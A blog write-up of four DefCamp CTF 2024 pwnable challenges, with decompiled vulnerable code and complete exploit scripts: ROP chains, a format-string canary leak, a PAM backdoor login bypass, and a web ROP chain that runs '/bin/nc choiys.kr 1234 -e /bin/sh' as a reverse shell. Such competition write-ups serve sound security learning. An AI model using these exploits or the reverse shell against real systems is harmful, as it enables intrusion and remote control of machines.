# DefCamp CTF 2024 Qual

{{< image src="https://i.postimg.cc/KvVFnP5F/2024-10-05-1-42-03.png" caption="DefCamp CTF 2024 Qual Scoreboard">}}

I participated in DefCamp CTF 2024 Qualifier as part of the `SaturnX` team. And our team took 7th place. The finals are limited to 15 places, so our team qualified for the finals in Romania!!😆🥳

I focused on the pwnable challenges and solved all the pwnable challenges by myself within the competition time.

# Pwn
## ftp-console(90 solves)
{{< admonition info "Challenge Description" false >}}
We got a very strange ftp console? Can you retrive the flag?
{{< /admonition >}}
### Analysis
When opening the binary through IDA, there was a clear stack buffer overflow vulnerability. There was also a leak vulnerability because the address of the system function was printed. Since it was a 32-bit binary, 32-bit ROP was performed. Since the server's libc and the local libc versions were the same, there was no need to match the libc versions separately!

```c
int login(void)
{
  char overflow_buf[32]; // [esp+Ch] [ebp-4Ch] BYREF
  char username[32]; // [esp+2Ch] [ebp-2Ch] BYREF
  int v3; // [esp+4Ch] [ebp-Ch]

  v3 = 0;
  puts("220 FTP Service Ready");
  printf("USER ");
  fgets(username, 32, stdin);
  username[strcspn(username, "\n")] = 0;
  puts("331 Username okay, need password.");
  printf("[DEBUG] Password buffer is located at: %lp\n", &system);
  printf("PASS ");
  fgets(overflow_buf, 0x64, stdin);
  if ( !strcmp(username, "admin") && !strcmp(overflow_buf, "password123\n") )
    v3 = 1;
  if ( v3 )
    return puts("230 User logged in, proceed.");
  else
    return puts("530 Login incorrect.");
}
```
### Solve
There is nothing to explain. Just ROP.
```py
from pwn import *

# p = process('./ftp_server')
p = remote('35.246.220.107', 31125)
e = ELF('./ftp_server')
libc = ELF('./libc.so.6')

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'i386'

p.sendline(b'a')

p.recvuntil(b'at: ')
leak = int(p.recvline().strip(), 16)
libc_base = leak - 0x48170

log.info(f'leak: {hex(leak)}')
log.info(f'libc_base: {hex(libc_base)}')

# gdb.attach(p, '''
# b *0x80492EB
# ''')

og = libc_base + 0x172952
binsh = next(libc.search(b'/bin/sh')) + libc_base
pop_edi_ret = libc_base + 0x00021e78

pay = b'a'*0x50
pay += p32(leak)
pay += p32(pop_edi_ret)
pay += p32(binsh)

p.sendline(pay)

p.interactive()
```
{{< admonition note "flag" true >}}
`CTF{c7160e6e316920f7c02d1d6eb228f0d7f2fb836bb0db2fb11eaf43577c91b691}`
{{< /admonition >}}

## buy-cooffe(89 solves)
{{< admonition info "Challenge Description" false >}}
It’s early morning, and the caffeine hasn’t quite kicked in yet. As you sip your cup of coffee, you notice something odd – a mysterious program named cooffee is running on your system.
{{< /admonition >}}
### Analysis
The binary for this challenge had a clear format string bug and stack overflow vulnerability. There was also a leak vulnerability because the address of the printf function was printed.
```c
unsigned __int64 coffee()
{
  char format[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Coffee Time\n$ ");
  gets(format);
  printf(format);
  printf("What is this? %p\n", &printf);
  printf("\nCoffee Time\n$ ");
  fread(format, 1uLL, 0x50uLL, stdin);
  puts(format);
  return __readfsqword(0x28u) ^ v2;
}
```
### Solve
This binary have stack canary. I use FSB to leak canary. And just ROP.
```py
from pwn import *

# p = process("./chall", env={"LD_PRELOAD":"./libc-2.31.so"})
p = remote('34.159.64.109', 32324)
e = ELF("./chall")

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p.sendline(b'%9$p')

p.recvuntil(b'$ ')
canary = int(p.recvuntil(b'W').strip(b'W'), 16)

log.info(f'canary: {hex(canary)}')

p.recvuntil(b'? ')
leak = int(p.recvline().strip(), 16)
log.info(f'leak: {hex(leak)}')

libc_base = leak - 0x61c90
log.info(f'libc_base: {hex(libc_base)}')
# gdb.attach(p)

og = libc_base + 0xe3b01

pay = b'a' * 0x18
pay += p64(canary)
pay += b'a' * 8
pay += p64(og)
pay += b'a' * (0x50 - len(pay))

p.sendlineafter(b'$', pay)

p.interactive()
```
{{< admonition note "flag" true >}}
`CTF{b5d4efc30c05420acb161eb92e120a902187d9710b297fba36d42528ea4ae09d}`
{{< /admonition >}}

## aptssh(41 solves)
{{< admonition info "Challenge Description" false >}}
Someone backdoored us with a strange PAM module, and now anyone can log in with aptssh:aptssh. I think they were able to get our flag.
{{< /admonition >}}

### Analysis
There was no binary for the challenge. After starting the challenge instance and connecting via ssh with the provided username and password, two base64 encoded binaries were provided.

One binary was the linked binary and one was the object file before linking.
Since the two operate in the same way, I will explain them as a single binary.

In the challenge description, it said that someone installed a backdoor via a suspicious PAM module. So I started analyzing it after thinking that this was that PAM module.

```c
int __fastcall pam_sm_authenticate(__int64 a1, __m128 _XMM0)
{
  int result; // eax
  ...
  char *username; // [rsp+18h] [rbp-110h]
  char *authtok; // [rsp+20h] [rbp-108h] MAPDST BYREF
  char s2[8]; // [rsp+28h] [rbp-100h] BYREF
  char s[16]; // [rsp+30h] [rbp-F8h] BYREF
  int v23; // [rsp+90h] [rbp-98h]

  rand();
  __asm { vpxor   xmm0, xmm0, xmm0 }
  v23 = 0;
  __asm
  {
    vmovdqa xmmword ptr [rsp+128h+s], xmm0
    vmovdqa [rsp+128h+var_E8], xmm0
    vmovdqa [rsp+128h+var_D8], xmm0
    vmovdqa [rsp+128h+var_C8], xmm0
    vmovdqa [rsp+128h+var_B8], xmm0
    vmovdqa [rsp+128h+var_A8], xmm0
  }
  if ( dfgebrycw() )
  {
    v4 = 10000;
    do
      v4 -= 8;
    while ( v4 );
    return 10;
  }
  if ( (unsigned int)pam_get_user() )
    return 10;
  if ( (unsigned int)pam_get_authtok(a1, 6LL, &authtok, 0LL) || dfgebrycw() )
    return 7;
  send_debug_message();
  if ( !strcmp(authtok, "aptssh") )
  {
    if ( !strcmp(username, "aptssh") )
    {
      output_base64_file(a1, "/lib/security/pam_passfile.so");
      output_base64_file(a1, "/pam_passfile.o");
      return 0;
    }
    return 10;
  }
  if ( ierubvhcjsx() )
    return 10;
  if ( dfgebrycw() )
    return 7;
  pam_casual_auth(&v13);
  if ( strlen(authtok) > 0x64 )
  {
    v5 = 7000;
    do
      v5 -= 8;
    while ( v5 );
    *(_DWORD *)s2 = 0xADC29EC3;
    *(_WORD *)&s2[6] = 0xAFC3;
    *(_WORD *)&s2[4] = v13;                     // 0xBEC2
    s[0] = 0;
    result = memcmp(authtok + 0x64, s2, 9uLL);
    if ( !result )
    {
      v10 = 0x2710;
      do
        v10 -= 8;
      while ( v10 );
      return result;
    }
  }
  if ( ierubvhcjsx() )
    return 10;
  __strcpy_chk();
  if ( strcmp(username, "sshuser") )
  {
    v11 = 10000;
    do
      v11 -= 8;
    while ( v11 );
    return 10;
  }
  v6 = fopen("/home/sshuser/pass.txt", "r");
  v7 = v6;
  if ( !v6 )
    return 7;
  if ( !fgets(s, 0x64, v6) )
  {
    fclose(v7);
    v12 = 10000;
    do
      v12 -= 8;
    while ( v12 );
    return 7;
  }
  fclose(v7);
  v8 = strcspn(s, "\n");
  s[v8] = 0;
  result = strcmp(authtok, s);
  if ( result )
    return 7;
  return result;
}
```
I was able to find the core logic in the pam_sm_authenticate function, and through it I was able to see that it performs user authentication when connecting to ssh.

### Solve
If you look closely at the logic of the above pseudo code, you can see that authentication can be done with another user (`sshuser`). There is also one more suspicious logic.

```c
  if ( strlen(authtok) > 0x64 )
  {
    v5 = 7000;
    do
      v5 -= 8;
    while ( v5 );
    *(_DWORD *)s2 = 0xADC29EC3;
    *(_WORD *)&s2[6] = 0xAFC3;
    *(_WORD *)&s2[4] = v13;                     // 0xBEC2
    s[0] = 0;
    result = memcmp(authtok + 0x64, s2, 9uLL);
    if ( !result )
    {
      v10 = 0x2710;
      do
        v10 -= 8;
      while ( v10 );
      return result;
    }
  }
```
This is the logic right above. When the length of the password is 0x64 or more, you can see that the authentication is performed by comparing the 8 bytes (excluding null bytes) that follow if they are the same. Through this backdoor logic, you can log in as `sshuser`.

```py
from pwn import *

context.log_level = 'debug'

passwd = b'A'*0x64 + b'\xc3\x9e\xc2\xad\xc2\xbe\xc3\xaf'

# passwd = b'A' * 0x64

r = ssh(host='34.107.71.117', user='sshuser', password=passwd, port=31689, raw=True)

print(r['cat flag.txt'])
```
{{< admonition note "flag" true >}}
`ctf{ba1e7756b2a842641357e840b47a477924b8deb0078e715754247453abb587be}`
{{< /admonition >}}

## super-notes(19 solves)
{{< admonition info "Challenge Description" false >}}
Here's my note taking app! If you manage to crash the application make sure to wait 2-3minutes for it to restart. You don't have to restart the task.
{{< /admonition >}}

### Analysis
This challenge was a Web + Pwnable challenge and took the longest to solve.
The binary was stripped and statically compiled, so it took a long time to analyze.

However, because the vulnerability was simple, it didn't take long to find it.

There was a part that added notes written in binary to an HTML file, and as I continued to add notes, the contents of the notes continued to be added to the HTML file, causing an overflow.

However, the size of the content that could be added to a note was limited to 0x20, and it was difficult to perform ROP with only the content of the note.

### Solve
There was also one more obstacle: when sending an HTTP request, bytes like null bytes or \x2b were all url-encoded, making it difficult to write the payload. I struggled a lot here. However, if you look closely at the binary again, there was logic to replace these bytes.

```c
for ( j = 0; j < v6; ++j )
      {
        if ( *(_BYTE *)(*(_QWORD *)(qword_4D4578 + 8LL * i) + j) == 0x2B )
        {
          *(_BYTE *)(*(_QWORD *)(qword_4D4578 + 8LL * i) + j) = ' ';
        }
        else if ( *(_BYTE *)(*(_QWORD *)(qword_4D4578 + 8LL * i) + j) == '0' )
        {
          *(_BYTE *)(*(_QWORD *)(qword_4D4578 + 8LL * i) + j) = 0;
        }
      }
```

With the help of the above logic, I was able to write the payload.
There were username and password variables on the global variable side, and I could input `0xff` here.

Therefore, I wrote a ROP chain on the username and was able to overwrite `rbp` through the overflow vulnerability, and through this, I performed a stack pivot and executed the ROP chain on the username side.

However, for these Web + Pwn challenges, you can't just run the shell, you have to get the flag through reverse shell. This is where I wasted a lot of time. I tried to open the reverse shell through execve syscall, but something didn't work properly in the process of passing the arguments.

Also, here's a funny thing, to open a reverse shell, the domain name must not contain 0, and the port number must not contain 0 either. This is because the input is weird due to url encoding! lol

At that time, I had not set up a domain name on the my Vultr server, so I borrowed another team member's server and wrote an exploit!

```py
import requests
from pwn import *
import string
from urllib import parse

host = b'34.107.93.11'
port = 32650
url = b"http://34.107.93.11:32650"

# host = b'localhost'
# port = 1339
# url = b"http://localhost:1339"
username_rop = b'\x10\30\x4d00000' # RBP
# START ROP
# 0x0000000000452a17
username_rop += b'\x17\x2a\x4500000' # POP RAX; RET
username_rop += b'\x3b0000000' # execve syscall number
# 0x0000000000402c8f : pop rdi ; ret
username_rop += b'\x8f\x2c\x4000000' # POP RDI; RET
username_rop += b'\x50\x22\x4d00000' # /bin/sh
# 0x000000000040acfe : pop rsi ; ret
username_rop += b'\xfe\xac\x4000000' # POP RSI; RET
username_rop += b'\x20\x22\x4d00000' # NULL
# 0x00000000004898eb : pop rdx ; pop rbx ; ret
username_rop += b'\xeb\x98\x4800000' # POP RDX; POP RBX; RET
username_rop += b'\xa0\x22\x4d00000' # NULL
username_rop += b'\xa0\x22\x4d00000' # NULL
# 0x0000000000402a44 : syscall
username_rop += b'\x44\x2a\x4000000' # SYSCALL
username_rop += b'a'*0x10

context.log_level = 'debug'

register = b'''POST /login HTTP/1.1\r
Host: 34.107.93.11:32462\r

username=%b&password=%b''' % (b'caca',b'caca')

p = remote(host, port)
p.send(register)
p.close()

passwd = b'\x50\x22\x4d00000' # /bin/nc
passwd += b'\x58\x22\x4d00000' # choiys.kr
passwd += b'\x62\x22\x4d00000' # 1234
passwd += b'\x67\x22\x4d00000' # -e
passwd += b'\x6a\x22\x4d00000' # /bin/sh
passwd += b'00000000'
passwd += b'/bin/nc0'
passwd += b'choiys.kr0'
passwd += b'12340'
passwd += b'-e0'
passwd += b'/bin/sh0'

user_info = {
    "username" : username_rop,
    "password" : passwd,
}

log.info(f"username : {user_info['username']}")
log.info(f"password : {user_info['password']}")

register = b'''POST /register HTTP/1.1\r
Host: 34.107.93.11:32462\r

username=%b&password=%b''' % (user_info['username'], user_info['password'])

p = remote(host, port)
p.send(register)
p.close()


def add_note(data, debug=False):
    # assert len(data) <= 0x20
    res = requests.post(url+b'/add_note', data={'note_content': data})
    if res.status_code == 200:
        log.info(f'add_note : {data}')
    if debug:
        print(res.request.headers)
        print(res.text)
        
def delete_note(idx):
    res = requests.post(url+b'/delete_note&index=' + idx)
    if res.status_code == 200:
        log.info(f'delete_note {idx} : {res.status_code}')

# add_note(b'A' * 0x20)

for i in range(49):
    add_note(b'B' * 0x20)

pay = b'''POST /add_note HTTP/1.1\r\nHost: localhost:1339\r\nUser-Agent: python-requests/2.32.3\r\nAccept-Encoding: gzip, deflate, zstd\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: 87\r\n\r\nnote_content='''
pay += b'A' * 6
pay += b'00000\x20\x21\x4d'
pay += b'\x20\x21\x4d00000'

p = remote(host, port)
p.send(pay)
p.close()

add_note(b'B' * 0x20)
```
{{< admonition note "flag" true >}}
`CTF{5b442e245aa97225a1b6be072b9e29a5ee5260ddeea7dbd06eb08433c07c5b39}`
{{< /admonition >}}

## Conclusion
Having successfully completed this DefCamp 2024 CTF qual, I am participating in the overseas CTF finals offline for the first time! The finals will be held in the Attack & Defense format, so I am really looking forward to it! See you in Romania!
